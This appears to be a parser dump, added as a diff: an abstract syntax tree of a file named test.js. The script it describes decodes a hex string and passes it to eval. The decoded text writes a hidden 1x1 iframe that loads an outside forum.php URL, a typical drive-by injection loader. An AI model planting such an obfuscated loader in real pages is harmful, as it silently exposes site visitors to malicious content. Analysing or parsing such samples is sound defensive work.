@@ -1,0 +1,187 @@
+Reading test.js
+{
+    "type": "Program",
+    "body": [
+        {
+            "type": "VariableDeclaration",
+            "declarations": [
+                {
+                    "type": "VariableDeclarator",
+                    "id": {
+                        "type": "Identifier",
+                        "name": "t"
+                    },
+                    "init": {
+                        "type": "Literal",
+                        "value": "",
+                        "raw": "\"\""
+                    }
+                }
+            ],
+            "kind": "var"
+        },
+        {
+            "type": "VariableDeclaration",
+            "declarations": [
+                {
+                    "type": "VariableDeclarator",
+                    "id": {
+                        "type": "Identifier",
+                        "name": "arr"
+                    },
+                    "init": {
+                        "type": "Literal",
+                        "value": "646f63756d656e742e777269746528273c696672616d65207372633d22687474703a2f2f766e62 757974612e636f2e62652f666f72756d2e7068703f74703d3637356561666563343331623166373222 2077696474683d223122206865696768743d223122206672616d65626f726465723d2230223e3c2f6 96672616d653e2729",
+                        "raw": "\"646f63756d656e742e777269746528273c696672616d65207372633d22687474703a2f2f766e62 757974612e636f2e62652f666f72756d2e7068703f74703d3637356561666563343331623166373222 2077696474683d223122206865696768743d223122206672616d65626f726465723d2230223e3c2f6 96672616d653e2729\""
+                    }
+                }
+            ],
+            "kind": "var"
+        },
+        {
+            "type": "ForStatement",
+            "init": {
+                "type": "AssignmentExpression",
+                "operator": "=",
+                "left": {
+                    "type": "Identifier",
+                    "name": "i"
+                },
+                "right": {
+                    "type": "Literal",
+                    "value": 0,
+                    "raw": "0"
+                }
+            },
+            "test": {
+                "type": "BinaryExpression",
+                "operator": "<",
+                "left": {
+                    "type": "Identifier",
+                    "name": "i"
+                },
+                "right": {
+                    "type": "MemberExpression",
+                    "computed": false,
+                    "object": {
+                        "type": "Identifier",
+                        "name": "arr"
+                    },
+                    "property": {
+                        "type": "Identifier",
+                        "name": "length"
+                    }
+                }
+            },
+            "update": {
+                "type": "AssignmentExpression",
+                "operator": "+=",
+                "left": {
+                    "type": "Identifier",
+                    "name": "i"
+                },
+                "right": {
+                    "type": "Literal",
+                    "value": 2,
+                    "raw": "2"
+                }
+            },
+            "body": {
+                "type": "ExpressionStatement",
+                "expression": {
+                    "type": "AssignmentExpression",
+                    "operator": "+=",
+                    "left": {
+                        "type": "Identifier",
+                        "name": "t"
+                    },
+                    "right": {
+                        "type": "CallExpression",
+                        "callee": {
+                            "type": "MemberExpression",
+                            "computed": false,
+                            "object": {
+                                "type": "Identifier",
+                                "name": "String"
+                            },
+                            "property": {
+                                "type": "Identifier",
+                                "name": "fromCharCode"
+                            }
+                        },
+                        "arguments": [
+                            {
+                                "type": "CallExpression",
+                                "callee": {
+                                    "type": "Identifier",
+                                    "name": "parseInt"
+                                },
+                                "arguments": [
+                                    {
+                                        "type": "BinaryExpression",
+                                        "operator": "+",
+                                        "left": {
+                                            "type": "MemberExpression",
+                                            "computed": true,
+                                            "object": {
+                                                "type": "Identifier",
+                                                "name": "arr"
+                                            },
+                                            "property": {
+                                                "type": "Identifier",
+                                                "name": "i"
+                                            }
+                                        },
+                                        "right": {
+                                            "type": "MemberExpression",
+                                            "computed": true,
+                                            "object": {
+                                                "type": "Identifier",
+                                                "name": "arr"
+                                            },
+                                            "property": {
+                                                "type": "BinaryExpression",
+                                                "operator": "+",
+                                                "left": {
+                                                    "type": "Identifier",
+                                                    "name": "i"
+                                                },
+                                                "right": {
+                                                    "type": "Literal",
+                                                    "value": 1,
+                                                    "raw": "1"
+                                                }
+                                            }
+                                        }
+                                    },
+                                    {
+                                        "type": "Literal",
+                                        "value": 16,
+                                        "raw": "16"
+                                    }
+                                ]
+                            }
+                        ]
+                    }
+                }
+            }
+        },
+        {
+            "type": "ExpressionStatement",
+            "expression": {
+                "type": "CallExpression",
+                "callee": {
+                    "type": "Identifier",
+                    "name": "eval"
+                },
+                "arguments": [
+                    {
+                        "type": "Identifier",
+                        "name": "t"
+                    }
+                ]
+            }
+        }
+    ],
+    "sourceType": "script"
+}
